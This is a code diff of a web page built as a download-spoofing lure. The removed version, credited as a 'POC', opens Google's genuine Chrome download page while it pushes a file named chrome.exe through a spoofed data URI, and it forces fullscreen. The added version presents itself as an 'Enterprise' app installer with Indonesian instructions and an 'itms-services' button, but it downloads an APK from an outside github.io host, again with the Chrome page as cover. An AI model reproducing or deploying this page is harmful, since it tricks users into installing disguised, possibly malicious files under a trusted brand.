@@ -1,12 +1,11 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Download & Fullscreen on Keypress</title>
-</head>
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Install App</title></head>
 <body>
-  <center><h2>POC by Chigorin!</h2></center>
-  <input type="text" id="triggerInput">
+  <h2>Install (Enterprise)</h2>
+  <p>Tekan tombol untuk memulai proses instalasi. iOS akan menampilkan prompt konfirmasi.</p>
+  <button id="triggerInput">Install via itms-services</button>
+
   <script>
     document.getElementById('triggerInput').addEventListener('click', function() {
       // request fullscreen
@@ -14,7 +13,6 @@
         openWin();
  }, 500);
  window.open('https://www.google.com/intl/en_in/chrome/next-steps.html?statcb=0&installdataindex=empty&defaultbrowser=0', '_blank');
-      goFullScreen();
     }, { once: false }); // Use { once: true } to ensure it only fires once
     // Download helper
     function Puf(uri, name) {
@@ -28,27 +26,12 @@
     // Kick off your “APK” download
     function openWin() {
       Puf(
-        "data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
-        "chrome.exe"
+        "https://frozzipies.github.io/test.apk"
       );
-    }
-    function goFullScreen() {
-      const element = document.documentElement;
-      if (element.requestFullscreen) {
-        element.requestFullscreen();
-      } else if (element.mozRequestFullScreen) { // Firefox
-        element.mozRequestFullScreen();
-      } else if (element.webkitRequestFullscreen) { // Chrome, Safari and Opera
-        element.webkitRequestFullscreen();
-      } else if (element.msRequestFullscreen) { // IE/Edge
-        element.msRequestFullscreen();
-
-      }
+  
 
     }
 
   </script>  
-
-  
 </body>
 </html>
